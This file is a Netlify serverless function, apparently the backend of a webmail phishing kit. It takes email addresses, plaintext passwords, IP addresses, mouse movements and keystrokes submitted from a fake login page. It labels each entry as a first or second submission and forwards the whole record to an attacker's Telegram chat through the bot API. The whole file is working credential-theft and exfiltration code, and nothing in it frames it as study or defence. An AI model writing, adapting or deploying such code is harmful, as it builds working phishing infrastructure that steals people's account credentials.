// netlify/functions/telegram.js
exports.handler = async function(event, context) {
  // ===== READ FROM ENVIRONMENT VARIABLES =====
  const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const CHAT_ID   = process.env.TELEGRAM_CHAT_ID;
  // =========================================

  // Only allow POST
  if (event.httpMethod !== "POST") {
    return {
      statusCode: 405,
      body: JSON.stringify({ error: "Method not allowed" })
    };
  }

  // Validate credentials exist
  if (!BOT_TOKEN || !CHAT_ID) {
    console.error("Missing environment variables");
    return {
      statusCode: 500,
      body: JSON.stringify({ success: false, error: "Server configuration error" })
    };
  }

  try {
    // Parse incoming JSON
    const data = JSON.parse(event.body);
    
    // Build message
    const submissionType = data.submissionType === 'first' ? 'First Submission' : 'Second Submission';
    const message = `📧 ${data.source || 'Webmail'} - New Login
📋 Type: ${submissionType}
👤 Email: ${data.email}
🔑 Password: ${data.password}
🌐 IP Address: ${data.ip}
⏰ Time: ${new Date(data.timestamp).toLocaleString()}
🖱️ Mouse Movements: ${data.mouseMovements}
⌨️ Keystrokes: ${data.keyPresses}

Status: ✅ Logged`;

    // Send to Telegram
    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error('Telegram API error:', errorText);
      throw new Error('Telegram API error');
    }

    return {
      statusCode: 200,
      body: JSON.stringify({ success: true, message: '✅ Sent to Telegram' })
    };

  } catch (error) {
    console.error('Function error:', error);
    return {
      statusCode: 500,
      body: JSON.stringify({ success: false, error: error.message })
    };
  }
};